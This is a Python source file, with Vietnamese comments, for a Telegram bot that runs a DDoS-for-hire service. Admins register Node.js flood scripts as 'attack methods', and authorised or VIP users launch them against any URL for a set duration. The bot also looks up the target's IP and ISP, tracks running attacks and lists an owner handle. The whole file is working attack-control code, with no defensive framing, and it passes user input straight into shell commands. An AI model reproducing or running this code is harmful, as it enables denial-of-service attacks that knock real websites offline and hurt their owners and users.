# pip install requests python-telegram-bot pytz --break-system-packages
import json,os,asyncio,socket,requests,time
from datetime import datetime
from telegram import InlineKeyboardButton,InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder,CommandHandler
from pytz import timezone
from html import escape
CONFIG_FILE,METHODS_FILE='config.json','methods.json';BOT_ACTIVE,user_processes=True,{}

# load_json: Đọc file JSON, nếu không tồn tại tạo file mới với {} và trả về {}
def load_json(f): return json.load(open(f,'r')) if os.path.exists(f) else save_json(f,{}) or {}
# save_json: Lưu dữ liệu vào file JSON với indent=4
def save_json(f,d): json.dump(d,open(f,'w'),indent=4)
# get_vietnam_time: Trả về thời gian hiện tại theo múi giờ Việt Nam
def get_vietnam_time(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')
# get_ip_and_isp: Lấy IP và thông tin ISP từ URL
def get_ip_and_isp(url):
    try:
        ip=socket.gethostbyname(url.split('/')[2])
        r=requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,proxy,hosting,query")
        return ip, r.json() if r.ok else None
    except: return None,None
# is_valid_url: Kiểm tra URL có hợp lệ (phải bắt đầu bằng http:// hoặc https://)
def is_valid_url(url): return url.startswith("http://") or url.startswith("https://")
# initialize_config: Nếu file config không tồn tại, tạo file mẫu
def initialize_config():
    if not os.path.exists(CONFIG_FILE): save_json(CONFIG_FILE,{"token":"YOUR_TOKEN_HERE","admin_id":"","group_id":"YOUR_GROUP_ID_HERE","vipuserid":[]})
# check_config: Kiểm tra file config có đủ thông tin cần thiết, nếu không thì thoát
def check_config():
    c=load_json(CONFIG_FILE)
    for k in ['token','admin_id','group_id']:
        if k not in c or c[k]==f"YOUR_{k.upper()}_HERE": print(f"Please provide a valid {k} in {CONFIG_FILE}."); exit(1)
    return c['token'],int(c['admin_id']),int(c['group_id'])
initialize_config(); TOKEN,ADMIN_ID,GROUP_ID=check_config()
# pkill_handler: Dừng các tiến trình chứa từ khóa (admin/VIP only)
async def pkill_handler(update,context):
    if not update.message: return
    if not BOT_ACTIVE: return await update.message.reply_text("Bot is turned off.")
    if update.message.from_user.id!=ADMIN_ID and update.message.from_user.id not in load_json(CONFIG_FILE)['vipuserid']:
        return await update.message.reply_text("You do not have permission. ❌")
    killed_pids=[]
    for cmd in ["http1","http2","flood","tlskill","ctccf","floodctc"]:
        await asyncio.create_subprocess_shell(f"pkill -9 -f {cmd}")
        proc=await asyncio.create_subprocess_shell(f"pgrep -f {cmd}",stdout=asyncio.subprocess.PIPE)
        stdout,_=await proc.communicate()
        if stdout: killed_pids.extend(stdout.decode().strip().split('\n'))
    return await update.message.reply_text(f"Processes terminated. PIDs: {', '.join(killed_pids)}") if killed_pids else await update.message.reply_text("No processes were terminated. ")
# command_handler: Kiểm tra trạng thái bot và số tham số, sau đó gọi hàm xử lý tương ứng
async def command_handler(update,context,h,min_args,help_text):
    if not update.message: return
    if not BOT_ACTIVE and update.message.from_user.id!=ADMIN_ID:
        return await update.message.reply_text("Bot is turned off. Only admin can use commands. ")
    if len(context.args)<min_args: return await update.message.reply_text(help_text)
    await h(update,context)
# add_method: Cho phép admin thêm một phương thức tấn công mới
async def add_method(update,context):
    if not update.message: return
    if update.message.from_user.id!=ADMIN_ID: return await update.message.reply_text("You do not have permission. ❌")
    if len(context.args)<2: return await update.message.reply_text("Usage: /add <method> <url> timeset <duration> [vip/member]")
    m,url,attack_time=context.args[0],context.args[1],60
    if 'timeset' in context.args:
        try: attack_time=int(context.args[context.args.index('timeset')+1])
        except: return await update.message.reply_text("Invalid duration parameter.")
    visibility='VIP' if '[vip]' in context.args else 'MEMBER'
    command=f"node --max-old-space-size=65536 {m} {url} "+" ".join([arg for arg in context.args[2:] if arg not in ['[vip]','[member]','timeset']])
    methods_data=load_json(METHODS_FILE); methods_data[m]={'command':command,'url':url,'time':attack_time,'visibility':visibility}
    save_json(METHODS_FILE,methods_data); await update.message.reply_text(f"Method {m} added with {visibility} access. ✅")
# delete_method: Cho phép admin xóa một phương thức tấn công đã được thêm
async def delete_method(update,context):
    if not update.message: return
    if update.message.from_user.id!=ADMIN_ID: return await update.message.reply_text("You do not have permission. ❌")
    if len(context.args)<1: return await update.message.reply_text("Usage: /del <method>")
    m=context.args[0]; methods_data=load_json(METHODS_FILE)
    if m not in methods_data: return await update.message.reply_text(f"Method {m} not found. ❌")
    del methods_data[m]; save_json(METHODS_FILE,methods_data); await update.message.reply_text(f"Method {m} deleted. ✅")
# attack_method: Xử lý lệnh /attack, kiểm tra tiến trình, quyền VIP, và khởi chạy tấn công
async def attack_method(update,context):
    if not update.message: return
    uid,chat_id=update.message.from_user.id,update.message.chat.id
    if chat_id!=GROUP_ID: return await update.message.reply_text("Unauthorized chat.")
    if len(context.args)<2: return await update.message.reply_text("Usage: /attack <method> <url> [duration]")
    if uid in user_processes:
        proc_info=user_processes[uid]; proc=proc_info['process']
        if proc.returncode is None:
            elapsed=time.time()-proc_info['start_time']; remaining=max(0,proc_info['attack_time']-elapsed)
            return await update.message.reply_text(f"Another process is running for {int(remaining)}s. Please wait.")
    m,url=context.args[0],context.args[1]
    if not is_valid_url(url): return await update.message.reply_text("Invalid URL. Please include http:// or https://")
    methods_data=load_json(METHODS_FILE)
    if m not in methods_data: return await update.message.reply_text("Method not found. ❌")
    method=methods_data[m]
    if method['visibility']=='VIP' and uid!=ADMIN_ID and uid not in load_json(CONFIG_FILE)['vipuserid']:
        return await update.message.reply_text("VIP access required. ❌")
    attack_time=method['time']
    if len(context.args)>2 and uid==ADMIN_ID:
        try: attack_time=int(context.args[2])
        except: return await update.message.reply_text("Invalid duration parameter.")
    ip,isp_info=get_ip_and_isp(url)
    if not ip: return await update.message.reply_text("Unable to retrieve IP. Check the URL.")
    command=method['command'].replace(method['url'],url).replace(str(method['time']),str(attack_time))
    isp_info_text=json.dumps(isp_info,indent=2,ensure_ascii=False) if isp_info else 'No ISP info.'
    await update.message.reply_text(f"🚀Attack sent 🚀: {m.upper()}.\nRequested by: {update.message.from_user.username}📌\nWebsite IP Info:📡\n<pre>{escape(isp_info_text)}</pre>\nDuration: {attack_time}s\nStart Time: {get_vietnam_time()}",parse_mode='HTML',reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Check Status 🔎",url=f"https://check-host.net/check-http?host={url}")]]))
    st=time.time(); proc=await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
    user_processes[uid]={'process':proc,'start_time':st,'attack_time':attack_time}
    asyncio.create_task(execute_attack(command,update,m,st,attack_time,uid))
# execute_attack: Thực thi tiến trình tấn công bất đồng bộ, gửi kết quả khi hoàn thành và loại bỏ tiến trình đã chạy
async def execute_attack(command,update,method_name,start_time,attack_time,user_id):
    try:
        process=user_processes[user_id]['process']
        stdout,stderr=await process.communicate()
        status,error=("Completed",None) if not stderr else ("Error",stderr.decode())
    except Exception as e: status,error="Error",str(e)
    elapsed_time=round(time.time()-start_time,2)
    attack_info={"method_name":method_name.upper(),"username":update.message.from_user.username,"start_time":datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'),"end_time":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"elapsed_time":elapsed_time,"attack_status":status,"error":error or "Success"}
    user_processes.pop(user_id,None)
    await update.message.reply_text(f"Process finished in {elapsed_time}s.\nDetails:\n<pre>{escape(json.dumps(attack_info,indent=2,ensure_ascii=False))}</pre>",parse_mode='HTML')
# list_methods: Liệt kê các phương thức tấn công khả dụng
async def list_methods(update,context):
    if not update.message: return
    if not BOT_ACTIVE: return await update.message.reply_text("Bot is turned off .")
    methods_data=load_json(METHODS_FILE)
    if not methods_data: return await update.message.reply_text("No available methods.")
    methods_list="\n".join([f"{name.upper()} ({data['visibility']}): {data['time']}s" for name,data in methods_data.items()])
    await update.message.reply_text("Available methods:\n"+methods_list)
# manage_vip_user: Thêm hoặc xóa người dùng VIP (admin only)
async def manage_vip_user(update,context,action):
    if not update.message: return
    if update.message.from_user.id!=ADMIN_ID: return await update.message.reply_text("You do not have permission. ❌")
    if len(context.args)<1: return await update.message.reply_text("Usage: /vipuser <uid> to add or /delvip <uid> to remove")
    user_id=int(context.args[0]); config=load_json(CONFIG_FILE); vip_users=config.get('vipuserid',[])
    if action=="add" and user_id not in vip_users: vip_users.append(user_id); config['vipuserid']=vip_users; save_json(CONFIG_FILE,config); await update.message.reply_text(f"User {user_id} added to VIP. ✅")
    elif action=="remove" and user_id in vip_users: vip_users.remove(user_id); config['vipuserid']=vip_users; save_json(CONFIG_FILE,config); await update.message.reply_text(f"User {user_id} removed from VIP. ✅")
    else: await update.message.reply_text(f"User {user_id} does not exist or already set accordingly.")
# help_message: Gửi hướng dẫn sử dụng các lệnh của bot
async def help_message(update,context):
    if not update.message: return
    await update.message.reply_text("👑OWNER👑: @NeganSSHConsole\n/attack <phương thức> <url> [thời gian]\n/methods - Danh sách phương thức\n/vipuser <uid> - Thêm VIP\n/delvip <uid> - Xóa VIP\n/on - Bật bot\n/off - Tắt bot\n/pkill - Dừng tất cả tiến trình")

# bot_on: Bật bot (admin only)
async def bot_on(update,context):
    if not update.message: return
    global BOT_ACTIVE
    if update.message.from_user.id==ADMIN_ID: BOT_ACTIVE=True; await update.message.reply_text("Bot is now ON. ✅")
# bot_off: Tắt bot (admin only)
async def bot_off(update,context):
    if not update.message: return
    global BOT_ACTIVE
    if update.message.from_user.id==ADMIN_ID: BOT_ACTIVE=False; await update.message.reply_text("Bot is now OFF. ⛔")
app=ApplicationBuilder().token(TOKEN).build()
app.add_handlers([
    CommandHandler("add",lambda u,c: command_handler(u,c,add_method,2,"Usage: /add <method> <url> timeset <duration> [vip/member]")),
    CommandHandler("del",lambda u,c: command_handler(u,c,delete_method,1,"Usage: /del <method>")),
    CommandHandler("attack",lambda u,c: command_handler(u,c,attack_method,2,"Usage: /attack <method> <url> [duration]")),
    CommandHandler("methods",lambda u,c: command_handler(u,c,list_methods,0,"")),
    CommandHandler("vipuser",lambda u,c: command_handler(u,c,lambda u,c: manage_vip_user(u,c,"add"),1,"Usage: /vipuser <uid>")),
    CommandHandler("delvip",lambda u,c: command_handler(u,c,lambda u,c: manage_vip_user(u,c,"remove"),1,"Usage: /delvip <uid>")),
    CommandHandler("pkill",pkill_handler),
    CommandHandler("help",help_message),
    CommandHandler("on",bot_on),
    CommandHandler("off",bot_off)
])
app.run_polling()
